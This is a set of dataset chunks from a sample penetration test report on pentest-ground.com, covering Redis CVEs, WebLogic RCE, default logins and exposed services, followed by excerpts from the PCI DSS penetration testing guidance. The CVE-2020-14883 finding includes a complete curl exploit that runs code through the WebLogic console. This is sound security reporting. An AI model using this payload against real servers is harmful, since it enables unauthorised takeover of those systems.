    "text": "that persists on disk. An integer overflow bug in the ziplist data structure used by all versions of Redis can be exploited to corrupt the heap and potentially result with remote code execution. The vulnerability involves 81\\nmodifying the default ziplist configuration parameters (hash-max-ziplist-entries, hash-max-ziplist-value, zset-max-ziplist-entries or zset-max-ziplist-value) to a very large value, and then constructing specially crafted commands to create very large ziplists. The problem is fixed in Redis versions 6.2.6, 6.0.16, 5.0.14. An additional workaround to mitigate the problem without patching the redis-server executable is to prevent users from modifying the above configuration parameters. This can be done using ACL to restrict unprivileged users from using the CONFIG SET command. Exploit N/A Risk level Medium CVSS 6 CVE CVE-2021-32687 Summary Redis is an open source, in-memory database that persists on disk. An integer overflow bug affecting all versions of Redis can be exploited to corrupt the heap and potentially be used to leak arbitrary contents of the heap or trigger remote code execution. The vulnerability involves changing the default set-max- intset-entries configuration parameter to a very large value and constructing specially crafted commands to manipulate sets. The problem is fixed in Redis versions 6.2.6, 6.0.16 and 5.0.14. An additional workaround to mitigate the problem without patching the redis-server executable is to prevent users from modifying the set-max-intset-entries configuration parameter. This can be done using ACL to restrict unprivileged users from using the CONFIG SET command. 82\\nExploit N/A Risk level Medium CVSS 6 CVE CVE-2021-41099 Summary Redis is an open source, in-memory database that persists on disk. An integer overflow bug in the underlying string library can be used to corrupt the heap and potentially result with denial of service or remote code execution. The vulnerability involves changing the default proto-max-bulk-len configuration parameter to a very large value and constructing specially crafted network payloads or commands. The problem is fixed in Redis versions 6.2.6, 6.0.16 and 5.0.14. An additional workaround to mitigate the problem without patching the redis-server executable is to prevent users from modifying the proto-max-bulk- len configuration parameter. This can be done using ACL to restrict unprivileged users from using the CONFIG SET command. Exploit N/A Risk level Medium CVSS 6 CVE CVE-2021-32761 Summary Redis is an in-memory database that persists on disk. 83\\nA vulnerability involving out-of-bounds read and integer overflow to buffer overflow exists starting with version 2.2 and prior to versions 5.0.13, 6.0.15, and 6.2.5. On 32-bit systems, Redis `*BIT*` command are vulnerable to integer overflow that can potentially be exploited to corrupt the heap, leak arbitrary heap contents or trigger remote code execution. The vulnerability involves changing the default `proto-max- bulk-len` configuration parameter to a very large value and constructing specially crafted commands bit commands. This problem only affects Redis on 32-bit platforms, or compiled as a 32-bit binary. Redis versions 5.0.`3m 6.0.15, and 6.2.5 contain patches for this issue. An additional workaround to mitigate the problem without patching the `redis-server` executable is to prevent users from modifying the `proto-max-bulk-len` configuration parameter. This can be",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 19
    }
  },
  {
    "text": "This problem only affects Redis on 32-bit platforms, or compiled as a 32-bit binary. Redis versions 5.0.`3m 6.0.15, and 6.2.5 contain patches for this issue. An additional workaround to mitigate the problem without patching the `redis-server` executable is to prevent users from modifying the `proto-max-bulk-len` configuration parameter. This can be done using ACL to restrict unprivileged users from using the CONFIG SET command. Exploit N/A Risk level Medium CVSS 5.9 CVE CVE-2021-31294 Summary Redis before 6cbea7d allows a replica to cause an assertion failure in a primary server by sending a non- administrative command (specifically, a SET command). NOTE: this was fixed for Redis 6.2.x and 7.x in 2021. Versions before 6.2 were not intended to have safety guarantees related to this. Exploit N/A 84\\nRisk level Medium CVSS 5.5 CVE CVE-2022-36021 Summary Redis is an in-memory database that persists on disk. Authenticated users can use string matching commands (like `SCAN` or `KEYS`) with a specially crafted pattern to trigger a denial-of-service attack on Redis, causing it to hang and consume 100% CPU time. The problem is fixed in Redis versions 6.0.18, 6.2.11, 7.0.9. Exploit N/A Risk level Medium CVSS 5 CVE CVE-2021-32675 Summary Redis is an open source, in-memory database that persists on disk. When parsing an incoming Redis Standard Protocol (RESP) request, Redis allocates memory according to user-specified values which determine the number of elements (in the multi-bulk header) and size of each element (in the bulk header). An attacker delivering specially crafted requests over multiple connections can cause the server to allocate significant amount of memory. Because the same parsing mechanism is used to handle authentication requests, this vulnerability can also be exploited by unauthenticated users. The problem is fixed in Redis versions 6.2.6, 6.0.16 and 85\\n5.0.14. An additional workaround to mitigate this problem without patching the redis-server executable is to block access to prevent unauthenticated users from connecting to Redis. This can be done in different ways: Using network access control tools like firewalls, iptables, security groups, etc. or Enabling TLS and requiring users to authenticate using client side certificates. Exploit N/A Risk level Medium CVSS 5 CVE CVE-2015-8080 Summary Integer overflow in the getnum function in lua_struct.c in Redis 2.8.x before 2.8.24 and 3.0.x before 3.0.6 allows context-dependent attackers with permission to run Lua code in a Redis session to cause a denial of service (memory corruption and application crash) or possibly bypass intended sandbox restrictions via a large number, which triggers a stack-based buffer overflow. Exploit N/A Risk level Medium CVSS 5 CVE CVE-2021-3470 86\\nSummary A heap overflow issue was found in Redis in versions before 5.0.10, before 6.0.9 and before 6.2.0 when using a heap allocator other than jemalloc or glibc's malloc, leading to potential out of bound write or process crash. Effectively this flaw does not affect the vast majority of users, who use jemalloc or glibc malloc. Exploit N/A Risk level Medium CVSS 5 CVE CVE-2020-21468 Summary A segmentation fault in the redis-server component of Redis 5.0.7 leads to a denial of",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 20
    }
  },
  {
    "text": "potential out of bound write or process crash. Effectively this flaw does not affect the vast majority of users, who use jemalloc or glibc malloc. Exploit N/A Risk level Medium CVSS 5 CVE CVE-2020-21468 Summary A segmentation fault in the redis-server component of Redis 5.0.7 leads to a denial of service (DOS). NOTE: the vendor cannot reproduce this issue in a released version, such as 5.0.7 Exploit N/A Risk level Medium CVSS 4 CVE CVE-2021-32672 Summary Redis is an open source, in-memory database that persists on disk. When using the Redis Lua Debugger, users can send malformed requests that cause the debugger’s protocol parser to read data 87\\nbeyond the actual buffer. This issue affects all versions of Redis with Lua debugging support (3.2 or newer). The problem is fixed in versions 6.2.6, 6.0.16 and 5.0.14. Exploit N/A Risk level Medium CVSS 4 CVE CVE-2020-14147 Summary An integer overflow in the getnum function in lua_struct.c in Redis before 6.0.3 allows context- dependent attackers with permission to run Lua code in a Redis session to cause a denial of service (memory corruption and application crash) or possibly bypass intended sandbox restrictions via a large number, which triggers a stack-based buffer overflow. NOTE: this issue exists because of a CVE-2015-8080 regression. Exploit N/A Risk level Low CVSS 3.6 CVE CVE-2023-45145 Summary Redis is an in-memory database that persists on disk. On startup, Redis begins listening on a Unix socket 88\\nbefore adjusting its permissions to the user-provided configuration. If a permissive umask(2) is used, this creates a race condition that enables, during a short period of time, another process to establish an otherwise unauthorized connection. This problem has existed since Redis 2.6.0-RC1. This issue has been addressed in Redis versions 7.2.2, 7.0.14 and 6.2.14. Users are advised to upgrade. For users unable to upgrade, it is possible to work around the problem by disabling Unix sockets, starting Redis with a restrictive umask, or storing the Unix socket file in a protected directory. Exploit N/A Risk level Low CVSS 2.1 CVE CVE-2022-24736 Summary Redis is an in-memory database that persists on disk. Prior to versions 6.2.7 and 7.0.0, an attacker attempting to load a specially crafted Lua script can cause NULL pointer dereference which will result with a crash of the redis-server process. The problem is fixed in Redis versions 7.0.0 and 6.2.7. An additional workaround to mitigate this problem without patching the redis-server executable, if Lua scripting is not being used, is to block access to `SCRIPT LOAD` and `EVAL` commands using ACL rules. Exploit N/A Risk level Low 89\\nCVSS 1.8 CVE CVE-2022-3647 Summary ** DISPUTED ** A vulnerability, which was classified as problematic, was found in Redis up to 6.2.7/7.0.5. Affected is the function sigsegvHandler of the file debug.c of the component Crash Report. The manipulation leads to denial of service. The complexity of an attack is rather high. The exploitability is told to be difficult. The real existence of this vulnerability is still doubted at the moment. Upgrading to version 6.2.8 and",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 21
    }
  },
  {
    "text": "function sigsegvHandler of the file debug.c of the component Crash Report. The manipulation leads to denial of service. The complexity of an attack is rather high. The exploitability is told to be difficult. The real existence of this vulnerability is still doubted at the moment. Upgrading to version 6.2.8 and 7.0.6 is able to address this issue. The patch is identified as 0bf90d944313919eb8e63d3588bf63a367f020a3. It is recommended to apply a patch to fix this issue. VDB- 211962 is the identifier assigned to this vulnerability. NOTE: The vendor claims that this is not a DoS because it applies to the crash logging mechanism which is triggered after a crash has occurred. Exploit N/A Vulnerability description Vulnerabilities found for Redis Key-Value Store 5.0.7 Risk description These vulnerabilities expose the affected applications to the risk of unauthorized access to confidential data and possibly to denial of service attacks. An attacker could search for an appropriate exploit (or create one) for any of these vulnerabilities and use it to attack the system. Notes: - The vulnerabilities are identified based on the server's version. - Only the first 30 vulnerabilities with the highest risk are shown for each port. 90\\nRecommendation We recommend you to upgrade the affected software to the latest version in order to eliminate the risks imposed by these vulnerabilities. Classification Category ID / Value CVE CVE-2020-21468, CVE-2021-32626, CVE-2022-24834, CVE-2022- 24736,CVE-2021-21309, CVE-2015- 8080, CVE-2021-32627, CVE-2023- 25155, CVE-2023-45145, CVE-2022- 36021, CVE-2021-41099, CVE-2021- 31294, CVE-2021-3470, CVE-2022- 24735, CVE-2021-32687,CVE-2021- 32762, CVE-2021-32761, CVE-2021- 32628, CVE-2023-28856, CVE-2021- 32675, CVE-2022-3647, CVE-2021- 32672, CVE-2020-14147 Verification ✘ 91\\n4.2.5 Oracle WebLogic - Remote Code Execution (CVE-2023- 21839) Affected target pentest-ground.com Status: Open Port: 7001 Evidence We managed to detect this vulnerability using GIOP protocol in Oracle Server by sending a payload containing whoami command: Data received on handler oracle Vulnerability description We found that the target server is vulnerable to CVE-2023-21839, a Remote Code Execution inside the Core component of Oracle WebLogic Server. The root cause of this vulnerability is an insecure deserialization via T3, IIOP protocol that could allow an unauthenticated attacker to take control of the server. The attacker can send a crafted JNDI/RMI malicious object in order to achieve access to the server. We have detected this vulnerability by sending a crafted RMI object to the server with whoami payload and fetching the server response that was sent to one of our loggers. We send the response to a logger because this is an Out-of-Band vulnerability, meaning that the output of the command is not reflected in the response. Risk description The risk exists that a remote unauthenticated attacker can fully compromise the server in order to steal confidential information, install ransomware, or pivot to the internal network. Recommendation We recommend upgrading the Oracle WebLogic to a version higher than 12.2.1.4.0 or 14.1.1.0.0 , which can be done from the administrator panel. 92\\nReferences https://nvd.nist.gov/vuln/detail/CVE-2023-21839 https://www.oracle.com/security-alerts/cpujan2023.html Classification Category ID / Value CVSS 7 CVE CVE-2023-21839 Verification ✔ This finding was validated so it is not a False Positive. 93\\n4.2.6 Oracle Fusion",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 22
    }
  },
  {
    "text": "recommend upgrading the Oracle WebLogic to a version higher than 12.2.1.4.0 or 14.1.1.0.0 , which can be done from the administrator panel. 92\\nReferences https://nvd.nist.gov/vuln/detail/CVE-2023-21839 https://www.oracle.com/security-alerts/cpujan2023.html Classification Category ID / Value CVSS 7 CVE CVE-2023-21839 Verification ✔ This finding was validated so it is not a False Positive. 93\\n4.2.6 Oracle Fusion Middleware WebLogic Server Administration Console - Remote Code Execution (CVE-2020- 14883) Affected target pentest-ground.com Status: Open Port: 7001 Evidence We managed to detect this vulnerability using the following Request / Response chain. Endpoint: https://pentest- ground.com:7001/console/images/%252e%252e%252fconsole.portal How to reproduce curl -X 'POST' \\ -d 'test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('\\''we blogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");field.s etAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().get Method(\"getServletRequest\").invoke(obj); String result = new StringBuilder(\"2sL5MlSCjh9IWIa8iqf8pDSmOHc\").reverse().toString( ); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().ge tMethod(\"getResponse\").invoke(req);res.getServletOutputStream(). 94\\nwriteStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutpu tStream().flush(); currentThread.interrupt();'\\'')' \\ -H 'Accept-Encoding: gzip, deflate' \\ -H 'Accept-Language: en' \\ -H 'Content-Type: application/x-www-form-urlencoded' \\ -H 'Host: pentest-ground.com:7001' \\ -H 'User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36' 'https://pentest- ground.com:7001/console/images/%252e%252e%252fconsole.portal' Vulnerability description The Oracle Fusion Middleware WebLogic Server admin console in versions 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0 is vulnerable to an easily exploitable vulnerability that allows high privileged attackers with network access via HTTP to compromise Oracle WebLogic Server. Risk description The risk exists that a remote unauthenticated attacker can fully compromise the server to steal confidential information, install ransomware, or pivot to the internal network. Recommendation Apply the necessary patches or updates provided by Oracle to mitigate this vulnerability. References https://packetstormsecurity.com/files/160143/Oracle-WebLogic-Server-Administration- Console-Handle-Remote-Code-Execution.html https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14883 https://www.oracle.com/security-alerts/cpuoct2020.html http://packetstormsecurity.com/files/160143/Oracle-WebLogic-Server-Administration- Console-Handle-Remote-Code-Execution.html https://github.com/1n7erface/PocList 95\\nClassification Category ID / Value CVE CVE-2020-14883 Verification ✔ This finding was validated so it is not a False Positive. 96\\n4.2.7 Redis - Default Logins Affected target pentest-ground.com Status: Open Port: 6379 Evidence We managed to detect that the target server is set up with a default credential pair. We extracted the following information from the target: pentest-ground.com:6379 Authentication was performed without credentials. Username: \"\" Password: \"\" Vulnerability description Redis service was accessed with easily guessed credentials. Risk description The risk exist that a remote attacker could take advantage of the default credentials for taking over the default account. If an authenticated vulnerability is present on the machine, it could also be leveraged to exploit the target, compromising the underlying system. Recommendation Change the default login credentials. Use a strong password, at least 10 characters long, preferably randomly generated. Unless the login panel is intended to be exposed to the internet, we strongly recommend placing it behind a firewall. Verification ✔ This finding was validated so it is not a False Positive. 97\\n4.2.8 Redis Server - Unauthenticated Access Affected target pentest-ground.com Status: Open Port: 6379 Evidence We managed to detect a Redis Server - Unauthenticated Access, using the following Request / Response chain. Vulnerability description Redis server without any required authentication was discovered. Recommendation We recommend you to analyze if this resource should be available or not. References https://redis.io/topics/security Verification ✔ This finding was validated so it is not a False Positive. 98\\n4.2.9 SSH service exposed to the Internet Affected",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 23
    }
  },
  {
    "text": "/ Response chain. Vulnerability description Redis server without any required authentication was discovered. Recommendation We recommend you to analyze if this resource should be available or not. References https://redis.io/topics/security Verification ✔ This finding was validated so it is not a False Positive. 98\\n4.2.9 SSH service exposed to the Internet Affected target pentest-ground.com Status: Open Port: 4445 Evidence We managed to detect a publicly accessible SSH service. Starting Nmap ( https://nmap.org ) at 2025-01-30 09:15 EET Nmap scan report for pentest-ground.com (178.79.134.182) Host is up (0.00047s latency). rDNS record for 178.79.134.182: 178-79-134- 182.ip.linodeusercontent.com PORT STATE SERVICE VERSION 4445/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0) | ssh-auth-methods: | Supported authentication methods: | publickey |_ password Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 0.78 seconds How to reproduce 99\\nnmap -p 4445 -sV -n --script ssh-auth-methods --open pentest- ground.com Vulnerability description We found that the SSH service with username/password authentication is publicly accessible. Network administrators often use remote administration protocols to control devices like switches, routers, and other essential systems. However, allowing these services to be accessible via the Internet can increase security risks, creating potential opportunities for attacks on the organization. Risk description Exposing this service online with username/password authentication can enable attackers to launch authentication attacks, like guessing login credentials, and potentially gaining unauthorized access. Vulnerabilities, such as unpatched software, protocol flaws, or backdoors could also be exploited. An example is the CVE-2024-3094 (XZ Utils Backdoor) vulnerability. Recommendation We recommend turning off SSH with username/password authentication access over the Internet and instead using a Virtual Private Network (VPN) that mandates two-factor authentication (2FA). If the SSH service is essential for business purposes, we recommend limiting access only from designated IP addresses using a firewall. Furthermore, it is advisable to utilize SSH Public Key Authentication since it employs a key pair to verify the identity of a user or process. Verification ✔ This finding was validated so it is not a False Positive. 100\\n4.2.10 Redis service exposed to the Internet Affected target pentest-ground.com Status: Open Port: 6379 Evidence We managed to detect a publicly accessible Redis service. PORT STATE SERVICE VERSION 6379/tcp open redis Redis key-value store 5.0.7 How to reproduce nmap -p 6379 -sV -n --open pentest-ground.com Vulnerability description We found that the Redis service is publicly accessible. This service often holds critical organizational data, making it a potential prime target for determined attackers. Risk description The risk exists that an attacker exploits this issue by launching a password-based attack on the Redis service. If an attacker identifies a correct set of login details, they could gain access to the database and start enumerating, potentially revealing confidential information. Moreover, such vulnerabilities could lead to other forms of attacks, including privilege escalation, allowing attackers to run system commands and move laterally to other systems in the internal network. 101\\nRecommendation We recommend ensuring that the Redis service is not publicly accessible. The",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 24
    }
  },
  {
    "text": "database and start enumerating, potentially revealing confidential information. Moreover, such vulnerabilities could lead to other forms of attacks, including privilege escalation, allowing attackers to run system commands and move laterally to other systems in the internal network. 101\\nRecommendation We recommend ensuring that the Redis service is not publicly accessible. The Redis service should be safeguarded behind a firewall or made available only to users connected through a Virtual Private Network (VPN) server. However, if the Redis service is required to be directly accessible over the Internet, we recommend reconfiguring it such that it is accessible only from known IP addresses. Verification ✔ This finding was validated so it is not a False Positive. 102\\n4.2.11 End-of-Life (EOL) found for Redis key-value store Affected target pentest-ground.com Status: Open Port: 6379 Evidence We managed to detect that Redis key-value store has reached the End-of-Life (EOL). Version detected: 5.0.7 End-of-life date: 2022-04-27 Latest version for the cycle: 5.0.14 This release cycle (5.0) doesn't have long-term-support (LTS). The cycle was released on 2018-10-17 and its latest release date was 2021-10-04. The support ended on 2020-04-30. Risk description Using end-of-life (EOL) software poses significant security risks for organizations. EOL software no longer receives updates, including critical security patches. This creates a vulnerability landscape where known and potentially new security flaws remain unaddressed, making the software an attractive target for malicious actors. Attackers can exploit these vulnerabilities to gain unauthorized access, disrupt services, or steal sensitive data. Moreover, without updates, compatibility issues arise with newer technologies, leading to operational inefficiencies and increased potential for system failures. Additionally, regulatory and compliance risks accompany the use of EOL software. Many industries have strict data protection regulations that require up-to-date software to ensure the highest security standards. Non-compliance can result in hefty fines and legal consequences. Organizations also risk damaging their reputation if a breach occurs due to outdated software, eroding customer trust and potentially leading to a loss of business. Therefore, continuing to use EOL software undermines both security posture and business integrity, necessitating timely upgrades and proactive risk management strategies. 103\\nRecommendation To mitigate the risks associated with end-of-life (EOL) software, it's crucial to take proactive steps. Start by identifying any EOL software currently in use within your organization. Once identified, prioritize upgrading or replacing these applications with supported versions that receive regular updates and security patches. This not only helps close security gaps but also ensures better compatibility with newer technologies, enhancing overall system efficiency and reliability.Additionally, develop a comprehensive software lifecycle management plan. This plan should include regular audits to identify upcoming EOL dates and a schedule for timely updates or replacements. Train your IT staff and users about the importance of keeping software up to date and the risks associated with using outdated versions. By maintaining a proactive approach to software management, you can significantly reduce security risks, ensure compliance with industry regulations, and protect your organization's reputation and customer trust. Verification ✔ This finding was validated so it is not a False Positive. 104\\n5. Addendum",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 25
    }
  },
  {
    "text": "and the risks associated with using outdated versions. By maintaining a proactive approach to software management, you can significantly reduce security risks, ensure compliance with industry regulations, and protect your organization's reputation and customer trust. Verification ✔ This finding was validated so it is not a False Positive. 104\\n5. Addendum 5.1 Tools and techniques This is a list of tools used during the penetration test: Tool Target Start Time Network Scanner pentest-ground.com Jan 30, 2025 - 09:13 UTC+02 Website Scanner https://pentest-ground.com:4280/ Feb 12, 2025 - 11:58 UTC+02 105",
    "metadata": {
      "doc_id": "Sample-Pentest-Engagement-Report-group-by-target",
      "chunk_id": 26
    }
  },
  {
    "text": "Standard: PCI Data Security Standard (PCI DSS) Version: 1.1 Date: September 2017 Author: Penetration Test Guidance Special Interest Group PCI Security Standards Council Information Supplement: Penetration Testing Guidance\\nDocument Changes Date Document Description Pages Version March 2015 1.0 Initial release All September 2017 1.1 A number of clarifications, including: Various • Clarified intent of “social engineering” in Terminology. • Clarified guidance on black-box testing. • Restructured Section 2.2 for better flow, and clarified language describing intent of PCI DSS Requirement 11.3. • Expanded guidance related to back-end APIs. • Updated references to PCI SSC resources. • Minor grammatical updates. The intent of this document is to provide supplemental information. Information provided here does not i\\nTable of Contents 1 Introduction ........................................................................................................................................................ 4 1.1 Objective ....................................................................................................................................................... 4 1.2 Intended Audience ........................................................................................................................................ 4 1.3 Terminology................................................................................................................................................... 4 1.4 Navigating this Document ............................................................................................................................. 5 2 Penetration Testing Components .................................................................................................................... 6 2.1 How does a penetration test differ from a vulnerability scan? ...................................................................... 6 2.2 Scope ............................................................................................................................................................ 7 2.2.1 External Penetration Test ....................................................................................................................... 8 2.2.2 Internal Penetration Test ........................................................................................................................ 8 2.2.3 Testing Segmentation Controls .............................................................................................................. 8 2.2.4 Critical Systems ...................................................................................................................................... 9 2.3 Application-Layer and Network-Layer Testing .............................................................................................. 9 2.3.1 Authentication ......................................................................................................................................... 9 2.3.2 PA-DSS Compliant Applications ............................................................................................................ 9 2.3.3 Web Applications .................................................................................................................................. 10 2.3.4 Separate Testing Environment ............................................................................................................. 10 2.4 Segmentation Checks ................................................................................................................................. 10 2.5 Social Engineering ...................................................................................................................................... 11 2.6 What is considered a “significant change”? ................................................................................................ 11 3 Qualifications of a Penetration Tester ........................................................................................................... 12 3.1 Certifications................................................................................................................................................ 12 3.2 Past Experience .......................................................................................................................................... 12 4 Methodology ..................................................................................................................................................... 14 4.1 Pre-Engagement ......................................................................................................................................... 14 4.1.1 Scoping ................................................................................................................................................. 14 4.1.2 Documentation ..................................................................................................................................... 14 4.1.3 Rules of Engagement ........................................................................................................................... 15 4.1.4 Third-Party-Hosted / Cloud Environments ............................................................................................ 16 4.1.5 Success Criteria ................................................................................................................................... 16 4.1.6 Review of Past Threats and Vulnerabilities .......................................................................................... 16 4.1.7 Avoid scan interference on security appliances. .................................................................................. 17 4.2 Engagement: Penetration Testing............................................................................................................... 17 4.2.1 Application Layer .................................................................................................................................. 18 4.2.2 Network Layer....................................................................................................................................... 18 4.2.3 Segmentation ....................................................................................................................................... 19 4.2.4 What to do when cardholder data is encountered ................................................................................ 19 The intent of this document is to provide supplemental information. Information provided here does not ii\\n4.2.5 Post-Exploitation ................................................................................................................................... 19 4.3 Post-Engagement ....................................................................................................................................... 19 4.3.1 Remediation Best Practices ................................................................................................................. 19 4.3.2 Retesting Identified Vulnerabilities ....................................................................................................... 20 4.3.3 Cleaning up the Environment ............................................................................................................... 20 4.4 Additional Resources .................................................................................................................................. 20 5 Reporting and Documentation ........................................................................................................................ 21 5.1 Identified Vulnerability Reporting ................................................................................................................ 21 5.1.1 Assigning a Severity Score................................................................................................................... 21 5.1.2 Industry Standard References .............................................................................................................. 22 5.2 Reporting Guidelines ................................................................................................................................... 22 5.2.1 Penetration Test Report Outline ........................................................................................................... 22 5.2.2 Retesting Considerations and Report Outline ...................................................................................... 23 5.3 Evidence retention ...................................................................................................................................... 24 5.3.1 What is considered evidence? ............................................................................................................. 24 5.3.2 Retention .............................................................................................................................................. 24 5.4 Penetration Test Report Evaluation Tool .................................................................................................... 25 6 Case Studies / Scoping Examples ................................................................................................................. 27 6.1 E-commerce Penetration Test Case Study ................................................................................................. 27 6.2 Hosting Provider Penetration Test Case Study .......................................................................................... 30 6.3 Retail Merchant Penetration Test Case Study ............................................................................................ 35 Appendix A: Quick-Reference Table to Guidance on PCI DSS Penetration Testing Requirements ............. 40 Acknowledgements ............................................................................................................................................... 41 About the PCI Security Standards Council",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 0
    }
  },
  {
    "text": "27 6.1 E-commerce Penetration Test Case Study ................................................................................................. 27 6.2 Hosting Provider Penetration Test Case Study .......................................................................................... 30 6.3 Retail Merchant Penetration Test Case Study ............................................................................................ 35 Appendix A: Quick-Reference Table to Guidance on PCI DSS Penetration Testing Requirements ............. 40 Acknowledgements ............................................................................................................................................... 41 About the PCI Security Standards Council ......................................................................................................... 43 The intent of this document is to provide supplemental information. Information provided here does not iii\\n1 Introduction 1.1 Objective This information supplement provides general guidance and guidelines for penetration testing. The guidance focuses on the following:  Penetration Testing Components: Understanding of the different components that make up a penetration test and how this differs from a vulnerability scan including scope, application and network-layer testing, segmentation checks, and social engineering.  Qualifications of a Penetration Tester: Determining the qualifications of a penetration tester, whether internal or external, through their past experience and certifications.  Penetration Testing Methodologies: Detailed information related to the three primary parts of a penetration test: pre-engagement, engagement, and post-engagement.  Penetration Testing Reporting Guidelines: Guidance for developing a comprehensive penetration test report that includes the necessary information to document the test as well as a checklist that can be used by the organization or the assessor to verify whether the necessary content is included. The information in this document is intended as supplemental guidance and does not supersede, replace, or extend PCI DSS requirements. The current version of PCI DSS at the time of publication is v3.2; however, the general principles and practices offered here may also be applicable to other versions of PCI DSS. 1.2 Intended Audience This guidance is intended for entities that are required to conduct a penetration test whether they use an internal or external resource. In addition, this document is intended for companies that specialize in offering penetration test services, and for assessors who help scope penetration tests and review final test reports. The guidance is applicable to organizations of all sizes, budgets, and industries. 1.3 Terminology The following terms are used throughout this document:  Application-layer testing: Testing that typically includes websites, web applications, thick clients, or other applications.  Black-box testing: Testing performed without prior knowledge of the internal structure/design/implementation of the object being tested.  Common Vulnerability Scoring System (CVSS): Provides an open framework for communicating the characteristics and impacts of IT vulnerabilities.  Grey-box testing: Testing performed with partial knowledge of the internal structure/design/implementation of the object being tested. The intent of this document is to provide supplemental information. Information provided here does not 4\\n National Vulnerability Database (NVD): The U.S. government repository of standards based vulnerability management data. This data enables automation of vulnerability management, security measurement, and compliance (e.g., FISMA).  Network-layer testing: Testing that typically includes external/internal testing of networks (LANS/VLANS), between interconnected systems, and wireless networks.  Penetration tester, tester, or team: The individual(s) conducting the penetration test for the entity. They may be a resource internal or external to the entity.  Social engineering: Manipulation or deception of individuals into",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 1
    }
  },
  {
    "text": "Testing that typically includes external/internal testing of networks (LANS/VLANS), between interconnected systems, and wireless networks.  Penetration tester, tester, or team: The individual(s) conducting the penetration test for the entity. They may be a resource internal or external to the entity.  Social engineering: Manipulation or deception of individuals into divulging confidential or personal information.  White-box testing: Testing performed with knowledge of the internal structure/design/implementation of the object being tested. 1.4 Navigating this Document This document is organized in such a way to help the reader better understand penetration testing in a holistic sense. It begins by providing background and definitions for topics common to all penetration test efforts (including scoping the test, critical systems to test, application and network-layer test inclusions, etc.). The document then moves on to practical guidance on selecting a penetration tester, methodologies that are used before, during, and after a test, guidelines for reporting and evaluating test results. The document concludes with case studies that attempt to illustrate the concepts presented in this supplement. Appendix A provides a quick-reference table to specific sections of this document where guidance on a particular PCI DSS requirement can be found. This may be useful for those wishing to quickly correlate the penetration testing requirements and guidelines presented in PCI DSS Requirement 11.3. The intent of this document is to provide supplemental information. Information provided here does not 5\\n2 Penetration Testing Components The goals of penetration testing are: 1. To determine whether and how a malicious user can gain unauthorized access to assets that affect the fundamental security of the system, files, logs and/or cardholder data. 2. To confirm that the applicable controls required by PCI DSS—such as scope, vulnerability management, methodology, and segmentation—are in place. There are three types of penetration tests: black-box, white-box, and grey-box. In a black-box assessment, the client provides no information prior to the start of testing. In a white-box assessment, the entity may provide the penetration tester with full and complete details of the network and applications. For grey-box assessments, the entity may provide partial details of the target systems. PCI DSS penetration tests are typically performed as either white-box or grey-box assessments. These types of assessments yield more accurate results and provide a more comprehensive test of the security posture of the environment than a pure black-box assessment. Performing a black-box assessment, when the entity provides no details of the target systems prior to the start of the test, may require more time, money, and resources for the deliverables to meet the requirements of PCI DSS. 2.1 How does a penetration test differ from a vulnerability scan? The differences between penetration testing and vulnerability scanning, as required by PCI DSS, can be summarized as follows: Vulnerability Scan Penetration Test Purpose Identify, rank, and report vulnerabilities that, if Identify ways to exploit vulnerabilities to exploited, may result in an intentional or circumvent or defeat the security features of unintentional compromise of a system. system components. When At least quarterly and after significant",
    "metadata": {
      "doc_id": "Security Standards Council - Penetration-Testing-Guidance-v1_1",
      "chunk_id": 2
    }
  },
  {
    "text": "be summarized as follows: Vulnerability Scan Penetration Test Purpose Identify, rank, and report vulnerabilities that, if Identify ways to exploit vulnerabilities to exploited, may result in an intentional or circumvent or defeat the security features of unintentional compromise of a system. system components. When At least quarterly and after significant changes1. At least annually and upon significant changes2. How Typically a variety of automated tools combined A manual process that may include the use of with manual verification of identified issues. vulnerability scanning or other automated tools, resulting in a comprehensive report. 1 Refer to Section 2.6 of this document for guidance on significant changes. 2 Some entities may be required to perform penetration tests more frequently. Refer to the current version of PCI DSS to understand specific requirements. The intent of this document is to provide supplemental information. Information provided here does not 6\\nVulnerability Scan Penetration Test Reports Potential risks posed by known vulnerabilities, Description of each vulnerability verified and/or ranked in accordance with NVD/CVSS base potential issue discovered. More specific risks scores associated with each vulnerability. that vulnerability may pose, including specific methods how and to what extent it may be For PCI DSS, external vulnerability scans must exploited. Examples of vulnerabilities include but be performed by an ASV and the risks ranked in are not limited to SQL injection, privilege accordance with the CVSS. Internal vulnerability escalation, cross-site scripting, or deprecated scans may be performed by qualified personnel protocols. (does not require an ASV) and risks ranked in accordance with the organization’s risk-ranking process as defined in PCI DSS Requirement 6.1. An external vulnerability scan is conducted from outside the target organization. An internal vulnerability scan is conducted from inside the target organization. Duration Relatively short amount of time, typically several Engagements may last days or weeks seconds to several minutes per scanned host. depending on the scope of the test and size of the environment to be 